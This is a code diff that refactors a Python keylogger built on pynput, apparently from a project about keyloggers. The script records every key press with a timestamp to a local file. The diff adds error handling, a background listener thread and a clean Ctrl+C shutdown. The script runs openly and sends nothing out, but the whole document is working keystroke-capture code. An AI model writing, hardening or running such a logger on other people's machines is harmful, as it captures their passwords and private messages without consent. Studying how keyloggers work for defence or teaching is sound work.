@@ -10,16 +10,27 @@ projects involving keyloggers.
 from pynput import keyboard
 import time
 
+# Function to handle key presses
 def on_key_press(key):
-    log_file = open("keylog.txt", "a")
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    log_file.write(f"{timestamp} - {key}\n")
-    log_file.close()
+    try:
+        with open("keylog.txt", "a") as log_file:
+            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            log_file.write(f"{timestamp} - {key}\n")
+    except Exception as e:
+        print(f"Error: {e}")
 
+# Main function to start the keylogger
 def main():
     print("Press Ctrl+C to stop logging.")
-    with keyboard.Listener(on_press=on_key_press) as listener:
-        listener.join()
+    listener = keyboard.Listener(on_press=on_key_press)
+    listener.start()  # Start the listener in a separate thread
+    try:
+        while True:
+            time.sleep(0.1)  # Keep the main thread running
+    except KeyboardInterrupt:
+        print("\nLogging stopped.")
+        listener.stop()  # Stop the listener
+        listener.join()  # Wait for the listener thread to finish
 
 if __name__ == "__main__":
     main()
